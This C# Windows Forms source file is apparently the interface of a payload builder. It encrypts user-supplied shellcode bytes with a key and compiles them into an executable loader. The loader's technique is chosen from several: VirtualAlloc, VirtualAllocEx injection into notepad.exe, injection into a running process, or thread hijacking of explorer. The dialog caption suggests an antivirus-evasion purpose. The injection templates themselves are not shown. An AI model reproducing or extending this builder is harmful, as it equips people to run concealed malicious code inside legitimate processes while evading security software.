using System;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        private String filepath = null;
        public Form1()
        {
            InitializeComponent();
        }

        private void buton1_click(object sender, EventArgs e)
        {

            String[] initKey = keyBox.Text.Split(',');
            Byte[] initKeyB = hexStrToByteArray(initKey);

            String[] initIv = ivBox.Text.Split(',');
            Byte[] initIvB = hexStrToByteArray(initIv);

            String[] initPayload = ((payloadBox.Text).Replace("\r\n","")).Split(',');
            Byte[] initPayloadB = hexStrToByteArray(initPayload);

            Byte[] result = Encrypt.Encryption_Class.Encrypt(initKeyB, initPayloadB);

            String res = null;

            for (int i = 0; i < result.Length; i++)
            {
                
                if (i == result.Length-1)
                { res += result[i].ToString(); }
                else
                { res+=result[i].ToString() + ","; }
            }
            resultBox.Text = res;
        }


        private Byte[] hexStrToByteArray(String [] hexStr)
        {
            int i = 0;
            Byte[] tmp = new byte[hexStr.Length];

            foreach(String bt in hexStr)
            {
                tmp[i++] = Convert.ToByte(bt.Substring(2, 2), 16);
            }
            return tmp;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            String architecture = null;
            Compiler compiler = new Compiler();

            ThreadHijacking thrHijacking = null;
            VirtualAllocTech virtualAllocT = null;
            VirtualAllocExTech virtualAllocExT = null;
            VirtualAllocEx_existing_APP_Tech virtualAllocEx_existing = null;

            if (archX64.Checked)
                architecture = " /platform:x64";
            else architecture = " /platform:x86";
            try
            {
                if (virtualAlloc_Option.Checked)
                {
                    virtualAllocT = new VirtualAllocTech(keyBox.Text, resultBox.Text.Replace("\r\n", ""));
                    compiler.compileToExe(virtualAllocT.GetCode(), keyBox.Text, filepath, architecture);
                }
                else
                    if (virtualAllocEx_Option.Checked)
                {
                    procBox.Text = "notepad.exe(32)";
                    virtualAllocExT = new VirtualAllocExTech(keyBox.Text, resultBox.Text.Replace("\r\n", ""),procBox.Text);
                    compiler.compileToExe(virtualAllocExT.GetCode(), keyBox.Text, filepath, architecture);
                }
                else if (injectExistingApp.Checked)
                {
                    procBox.Enabled = true;
                    virtualAllocEx_existing = new VirtualAllocEx_existing_APP_Tech(keyBox.Text, resultBox.Text.Replace("\r\n", ""), procBox.Text);
                    compiler.compileToExe(virtualAllocEx_existing.GetCode(), keyBox.Text, filepath, architecture);
                }
                else if (threadHijacking_option.Checked)
                {
                    procBox.Enabled = true;
                    
                    thrHijacking = new ThreadHijacking(keyBox.Text, resultBox.Text.Replace("\r\n", ""),procBox.Text);
                    compiler.compileToExe(thrHijacking.GetCode(), keyBox.Text, filepath, " /platform:x64 /optimize");
                }
                MessageBox.Show("The operation completed successfully", "AV/\tor");

            }

            catch (Exception er)
            {
                MessageBox.Show(er.Message);
            }

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            genExe.Enabled = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();

            saveFileDialog1.Filter = "exe files (*.exe)|*.exe";
            saveFileDialog1.FilterIndex = 2;
            saveFileDialog1.RestoreDirectory = true;

            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {      
                label8.Text += saveFileDialog1.FileName;
                filepath = saveFileDialog1.FileName;
            }
            genExe.Enabled = true;

        }

        private void virtualAllocEx_Option_CheckedChanged(object sender, EventArgs e)
        {
            if (virtualAllocEx_Option.Checked)
                procBox.Text = "notepad.exe(32)";
            else if (virtualAlloc_Option.Checked)
                procBox.Text = "none";
            procBox.Enabled = false;
        }

        private void threadHijacking_option_CheckedChanged(object sender, EventArgs e)
        {
            archX64.Checked = true;
            procBox.Text = "explorer";
            procBox.Enabled = true;
        }

        private void injectExistingApp_CheckedChanged(object sender, EventArgs e)
        {
            procBox.Text = "explorer";
            procBox.Enabled = true;
        }
    }
}
